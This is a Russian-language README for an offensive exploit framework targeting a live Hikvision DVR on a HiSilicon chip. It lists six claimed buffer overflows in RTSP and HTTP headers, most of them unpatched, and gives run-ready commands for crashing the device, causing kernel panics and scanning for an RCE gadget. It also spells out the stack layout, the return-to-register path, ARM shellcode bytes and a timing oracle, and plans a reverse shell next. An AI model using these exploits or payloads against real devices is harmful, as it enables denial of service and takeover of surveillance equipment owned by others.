<div align="center">

```
  ██████╗██████╗  █████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██╗██████╗
 ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║    ██╔══██╗██╔══██╗████╗  ██║██╔══██╗
 ██║     ██████╔╝███████║███████╗███████║    ██████╔╝███████║██╔██╗ ██║██║  ██║
 ██║     ██╔══██╗██╔══██║╚════██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║██║  ██║
 ╚██████╗██║  ██║██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║██████╔╝
  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝
          ⊕  H I K V I S I O N   C A M E R A   T A R G E T I N G   T O O L  ⊕
```

**Независимое исследование pre-auth уязвимостей на живом DVR с HiSilicon Hi3531.**  
Без баз CVE. Без исходников. Без отладчика. Чистый динамический анализ.

![ARM](https://img.shields.io/badge/arch-ARM_Cortex--A9-lightgrey?style=flat-square)
![No ASLR](https://img.shields.io/badge/ASLR-нет-red?style=flat-square)
![No NX](https://img.shields.io/badge/NX-нет-red?style=flat-square)

<br>

<img src="docs/poster.png" width="780" alt="Crashbandicoot research poster"/>


![No Canary](https://img.shields.io/badge/canary-нет-red?style=flat-square)
![DoS](https://img.shields.io/badge/DoS-подтверждён-brightgreen?style=flat-square)
![RCE](https://img.shields.io/badge/RCE-в_процессе-yellow?style=flat-square)
![0days](https://img.shields.io/badge/0--days-5%E2%80%936-orange?style=flat-square)

</div>

---

## Цель

| | |
|---|---|
| **IP** | `█████████████` |
| **Сервисы** | RTSP `:554` · HTTP `:80` |
| **SoC** | HiSilicon Hi3531 — ARM Cortex-A9 r0p1, ARMv7-A, 32-bit LE |
| **Прошивка** | `digicap.dav` — версия `3050060061181310011`, AES-256-ECB |
| **Web-баннер** | `"Embedded Net DVR"` · jQuery 1.7.1 · realm `DVRDVS` |
| **Защиты** | ASLR ✗ · NX ✗ · Stack canary ✗ · Watchdog ✓ |

---

## Уязвимости

| # | Вектор | Поле | Тип | CVSS | Эффект | CVE? |
|---|--------|------|-----|------|--------|------|
| 1 | RTSP | `User-Agent` | Stack BOF | **9.8** | DoS ✅ · RCE 🔄 | Нет для этой прошивки |
| 2 | RTSP | `Transport` `client_port=` | Heap BOF | **7.5** | DoS ✅ | **0-day** |
| 3 | RTSP | `Scale` | Stack BOF | **8.1** | Kernel panic ✅ | **0-day** |
| 4 | RTSP | `Accept` | Stack BOF | **8.1** | Kernel panic ✅ | **0-day** |
| 5 | HTTP | `Host` | Heap BOF | **7.5** | DoS ✅ | **0-day** |
| 6 | HTTP | Флуд заголовками | Stack exhaust | **7.5** | DoS ✅ | **0-day** |

> Подробное сравнение с CVE-2014-4878/4879/4880 и CVE-2025-66177 → [`docs/cve-comparison.md`](docs/cve-comparison.md)

---

## Быстрый старт

```bash
# Проверка доступности цели и поверхности атаки
python3 exploits/crashbandicoot.py -t <IP> --mode check

# DoS — переполнение стека User-Agent (CVSS 9.8), крэш за ~2.5s
python3 exploits/crashbandicoot.py -t <IP> --mode dos-ua

# DoS — kernel panic через Scale/Accept, полная перезагрузка >90s
python3 exploits/crashbandicoot.py -t <IP> --mode dos-scale
python3 exploits/crashbandicoot.py -t <IP> --mode dos-accept

# Все DoS-векторы последовательно
python3 exploits/crashbandicoot.py -t <IP> --mode all-dos

# RCE-путь: слепой поиск гаджета BX R0 в 15MB mmap-регионе
python3 exploits/crashbandicoot.py -t <IP> --mode scan-bxr0

# Подтверждение RCE после нахождения гаджета
python3 exploits/crashbandicoot.py -t <IP> --mode rce --gadget 0xXXXXXXXX
```

> Требуется Python 3 + Pillow (`pip install Pillow`). Других зависимостей нет.

---

## Раскладка стека (подтверждена без отладчика)

```
Байты User-Agent:

  ┌──────────────────────────────────────────────────────┐
  │  [0   – 101]  ua_buf      102 байта  dst для strcpy  │  ← сюда ложится шеллкод
  │  [102 – 215]  locals      114 байт   локальные перем │
  │  [216 – 247]  R4–R11       32 байта  сохранённые рег │  ← должен быть kernel-space
  │  [248 – 251]  saved PC      4 байта                  │  ← PC_OFFSET = 248
  └──────────────────────────────────────────────────────┘

Ограничение нулевых байт: strcpy() останавливается на 0x00
→ каждый байт payload включая адрес возврата должен быть ненулевым
```

---

## Путь к RCE (ret2reg)

```
strcpy(ua_buf, user_agent)
       └─ R0 = ua_buf  (возвращаемое значение по AAPCS)

Перезаписываем saved PC → гаджет BX R0 (0xe12fff10, null-free)
       └─ CPU прыгает на R0 = ua_buf
              └─ исполняется LOOP_SC в ua_buf → бесконечный цикл
                     └─ сервис не перезапускается → оракул DEAD (>20s) → RCE подтверждён
```

```python
# LOOP-маяк — 102 байта, ARM32, 100% null-free
ARM_NOP  = b'\x01\x10\xa0\xe1'   # MOV R1,R1  (0xe1a01001 = kernel space)
ARM_LOOP = b'\xfe\xff\xff\xea'   # B .         (крутится вечно)
LOOP_SC  = ARM_NOP * 24 + ARM_LOOP + b'\x01\x01'
```

**Статус:** оракул работает (HIT=2.5s, 0 ложных DEAD) · проверено 117/938 кандидатов · BX R0 пока не найден

---

## Оракул таймингов

Единственный канал обратной связи — *время до перезапуска RTSP watchdog'ом* после крэша:

```
< 15s          →  HIT   — крэш в user-space, watchdog перезапустил
> 90s          →  PANIC — kernel panic, полная перезагрузка (Scale / Accept)
> 20s, нет
перезапуска    →  DEAD  — шеллкод крутится → RCE подтверждён
```

Без GDB. Без UART. Без `/proc`. Только секундомер.

---

## Прошивка

```
digicap.dav  294 МБ  AES-256-ECB  (ключ неизвестен)

Внешний заголовок HK20  108 байт  XOR-обфускация  ключ: публичный (hiktools)
  └─ Внутренний заголовок HK30  16 байт
       └─ Зашифрованное тело  ~280 МБ  AES-256-ECB

Что удалось выяснить без ключа:
  · ECB-режим → 40 065 повторяющихся блоков → восстановлено 626 КБ разметки разделов
  · Фиктивная контрольная сумма (checksum == длина заголовка)
  · Нет HMAC / подписи → тривиальное внедрение бэкдора при наличии ключа
  · Открытый хвост: последние 5 байт не зашифрованы ("ation")
  · Захардкоженный dev-IP 172.9.4.222 в common.js
```

---

## Структура проекта

```
.
├── exploits/
│   ├── crashbandicoot.py        ← основной фреймворк (все векторы + лого)
│   └── rtsp_bxr0_scan.py        ← standalone-сканер гаджетов BX R0
│
├── docs/
│   ├── cve-comparison.md        ← наши находки vs CVE-2014-4878/79/80, 2025-66177
│   ├── vulnerabilities/
│   │   ├── 01-ua-stack-overflow.md
│   │   ├── 02-transport-heap.md
│   │   ├── 03-scale-panic.md
│   │   ├── 04-accept-panic.md
│   │   ├── 05-http-host-overflow.md
│   │   └── 06-http-flood.md
│   ├── methodology/
│   │   ├── timing-oracle.md
│   │   ├── ret2reg.md
│   │   └── payload-construction.md
│   └── firmware/
│       ├── format-analysis.md
│       └── ecb-leak.md
│
├── research/
│   ├── RESEARCH.md              ← сводный технический отчёт
│   └── research_log.md          ← дневник, дни 1–13 + заключение
│
└── tools/                       ← 17 скриптов разведки и анализа
```

---

## Что дальше (если исследование возобновится)

1. **Плотный скан гаджетов** — `--step 0x401` → ~3 800 кандидатов, ~6 часов, почти полное покрытие
2. **Расшифровка прошивки** — ключ AES-256, скорее всего, в другом бинаре на устройстве; нужен RCE (замкнутый круг)
3. **Попробовать BX R4** — R4 напрямую управляется байтами payload [216–219]; нужен известный адрес ua_buf
4. **ARM32 reverse shell** — null-free, ≤102 байт; заменить LOOP_SC после подтверждения гаджета

---

## Ключевые числа

```
PC_OFFSET   248 байт     подтверждено через последовательность де Брёйна
ua_buf      102 байта    подтверждено бинарным поиском (103 = крэш)
mmap-регион 0x40000000 – 0x40F30000   ~15 МБ   mapped + executable
BX R0       \x10\xff\x2f\xe1          null-free, выровнен на 4
ARM_NOP     \x01\x10\xa0\xe1          LE=0xe1a01001 (kernel space, null-free)
Watchdog    ~2.5s (user crash)  /  >90s (kernel panic)  /  никогда (RCE)
0-days      5–6 (Transport · Scale · Accept · Host · Flood + UA на новой прошивке)
```

---

<div align="center">

*Исследование закрыто: 2026-05-26 · Все находки оригинальные · Базы CVE не использовались*

</div>
